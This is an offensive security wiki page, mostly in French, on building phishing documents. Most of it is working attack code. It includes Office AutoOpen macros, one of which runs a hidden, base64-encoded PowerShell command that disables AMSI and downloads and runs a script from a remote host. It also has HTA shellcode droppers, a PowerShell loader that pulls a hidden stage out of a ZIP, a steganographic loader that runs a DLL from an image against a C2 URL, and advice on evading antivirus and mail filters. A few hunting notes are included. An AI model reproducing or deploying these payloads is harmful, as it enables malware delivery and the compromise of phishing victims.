# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Office Documents

Microsoft Word effectue une validation des données du fichier avant d'ouvrir un fichier. La validation des données est effectuée sous la forme d'une identification de la structure des données, conformément à la norme OfficeOpenXML. Si une erreur survient lors de l'identification de la structure des données, le fichier analysé ne sera pas ouvert.

Habituellement, les fichiers Word contenant des macros utilisent l'extension `.docm`. Cependant, il est possible de renommer le fichier en changeant son extension et de conserver malgré tout ses capacités d'exécution de macros.\
Par exemple, un fichier RTF ne prend pas en charge les macros, par conception, mais un fichier DOCM renommé en RTF sera pris en charge par Microsoft Word et pourra exécuter des macros.\
Les mêmes mécanismes internes et procédés s'appliquent à l'ensemble des logiciels de la Microsoft Office Suite (Excel, PowerPoint etc.).

Vous pouvez utiliser la commande suivante pour vérifier quelles extensions seront exécutées par certains programmes Office :
```bash
assoc | findstr /i "word excel powerp"
```
Les fichiers DOCX référencant un modèle distant (File –Options –Add-ins –Manage: Templates –Go) qui inclut des macros peuvent également “exécuter” des macros.

### External Image Load

Aller à : _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Il est possible d'utiliser des macros pour exécuter du code arbitraire depuis le document.

#### Fonctions d'autochargement

Plus elles sont courantes, plus il est probable que l'AV les détecte.

- AutoOpen()
- Document_Open()

#### Exemples de code de macros
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Manually remove metadata

Accédez à **File > Info > Inspect Document > Inspect Document**, ce qui ouvrira le Document Inspector. Cliquez sur **Inspect** puis sur **Remove All** à côté de **Document Properties and Personal Information**.

#### Doc Extension

Une fois terminé, sélectionnez le menu déroulant **Save as type**, changez le format de **`.docx`** en **Word 97-2003 `.doc`**.\
Faites cela parce que vous **can't save macro's inside a `.docx`** et qu'il existe une **stigmatisation** **autour** de l'extension macro-enabled **`.docm`** (par ex. l'icône miniature affiche un énorme `!` et certaines passerelles web/email les bloquent entièrement). Par conséquent, cette ancienne extension **`.doc`** est le meilleur compromis.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA Files

Un HTA est un programme Windows qui **combine HTML et des langages de script (such as VBScript and JScript)**. Il génère l'interface utilisateur et s'exécute en tant qu'application « fully trusted », sans les contraintes du modèle de sécurité d'un navigateur.

Un HTA est exécuté à l'aide de **`mshta.exe`**, qui est typiquement **installé** avec **Internet Explorer**, rendant **`mshta` dépendant d'IE**. Donc s'il a été désinstallé, les HTA seront incapables de s'exécuter.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Forcer l'authentification NTLM

Il existe plusieurs façons de **forcer l'authentification NTLM "à distance"**, par exemple, vous pouvez ajouter des **images invisibles** dans des e-mails ou du HTML que l'utilisateur consultera (même HTTP MitM ?). Ou envoyer à la victime l'**adresse de fichiers** qui **déclencheront** une **authentification** rien qu'en **ouvrant le dossier.**

**Consultez ces idées et d'autres pages sur les pages suivantes :**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

N'oubliez pas que vous ne pouvez pas seulement voler le hash ou l'authentification mais aussi **perform NTLM relay attacks** :

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Des campagnes très efficaces livrent un ZIP contenant deux documents leurres légitimes (PDF/DOCX) et un .lnk malveillant. L'astuce est que le véritable loader PowerShell est stocké dans les octets bruts du ZIP après un marqueur unique, et le .lnk l'extrait et l'exécute entièrement en mémoire.

Flux typique implémenté par le one-liner PowerShell du .lnk :

1) Localiser le ZIP original dans des emplacements courants : Desktop, Downloads, Documents, %TEMP%, %ProgramData%, et le parent du répertoire de travail courant.  
2) Lire les octets du ZIP et trouver un marqueur codé en dur (par ex., xFIQCV). Tout ce qui suit le marqueur est la charge utile PowerShell embarquée.  
3) Copier le ZIP vers %ProgramData%, l'extraire là, et ouvrir le .docx leurre pour paraître légitime.  
4) Contourner AMSI pour le processus courant : [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true  
5) Déobfusquer l'étape suivante (par ex., supprimer tous les caractères #) et l'exécuter en mémoire.

Exemple de squelette PowerShell pour extraire et exécuter l'étape embarquée:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Remarques
- La livraison abuse souvent des sous-domaines PaaS réputés (p. ex., *.herokuapp.com) et peut restreindre les payloads (servir des ZIPs bénins en fonction de l'IP/UA).
- L'étape suivante décrypte fréquemment du base64/XOR shellcode et l'exécute via Reflection.Emit + VirtualAlloc pour minimiser les artefacts sur disque.

Persistence used in the same chain
- COM TypeLib hijacking du Microsoft Web Browser control afin que IE/Explorer ou toute application l'intégrant relance automatiquement le payload. Voir les détails et les commandes prêtes à l'emploi ici :

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- Fichiers ZIP contenant la chaîne marqueur ASCII (p. ex., xFIQCV) ajoutée aux données de l'archive.
- Des .lnk qui énumèrent les dossiers parent/utilisateur pour localiser le ZIP et ouvrent un document leurre.
- Altération d'AMSI via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Threads métier de longue durée se terminant par des liens hébergés sous des domaines PaaS de confiance.

## Steganography-delimited payloads in images (PowerShell stager)

Les chaînes de loaders récentes livrent un JavaScript/VBS obfusqué qui décode et exécute un PowerShell stager en Base64. Ce stager télécharge une image (souvent GIF) qui contient une .NET DLL encodée en Base64 cachée en texte clair entre des marqueurs de début/fin uniques. Le script recherche ces délimiteurs (exemples observés sur le terrain : «<<sudo_png>> … <<sudo_odt>>>»), extrait le texte intermédiaire, le décode Base64 en octets, charge l'assembly en mémoire et invoque une méthode d'entrée connue avec l'URL de C2.

Flux de travail
- Étape 1 : Dropper JS/VBS archivé → décode le Base64 embarqué → lance le PowerShell stager avec -nop -w hidden -ep bypass.
- Étape 2 : PowerShell stager → télécharge l'image, extrait le Base64 délimité par marqueurs, charge la .NET DLL en mémoire et appelle sa méthode (p. ex., VAI) en passant l'URL de C2 et les options.
- Étape 3 : Le loader récupère le payload final et l'injecte typiquement via process hollowing dans un binaire de confiance (généralement MSBuild.exe). Voir plus sur process hollowing et trusted utility proxy execution ici :

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Exemple PowerShell pour extraire une DLL depuis une image et invoquer une méthode .NET en mémoire :

<details>
<summary>Extracteur et chargeur de payload stego PowerShell</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Notes
- Il s'agit de ATT&CK T1027.003 (steganography/marker-hiding). Les marqueurs varient selon les campagnes.
- AMSI/ETW bypass and string deobfuscation sont couramment appliqués avant le chargement de l'assembly.
- Hunting: scanner les images téléchargées à la recherche de délimiteurs connus ; identifier PowerShell accédant aux images et décodant immédiatement des blobs Base64.

See also stego tools and carving techniques:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

A recurring initial stage is a small, heavily‑obfuscated `.js` or `.vbs` delivered inside an archive. Its sole purpose is to decode an embedded Base64 string and launch PowerShell with `-nop -w hidden -ep bypass` to bootstrap the next stage over HTTPS.

Skeleton logic (abstract):
- Read own file contents
- Locate a Base64 blob between junk strings
- Decode to ASCII PowerShell
- Execute with `wscript.exe`/`cscript.exe` invoking `powershell.exe`

Hunting cues
- Archived JS/VBS attachments spawning `powershell.exe` with `-enc`/`FromBase64String` in the command line.
- `wscript.exe` launching `powershell.exe -nop -w hidden` from user temp paths.

## Windows files to steal NTLM hashes

Consultez la page sur **places to steal NTLM creds** :

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
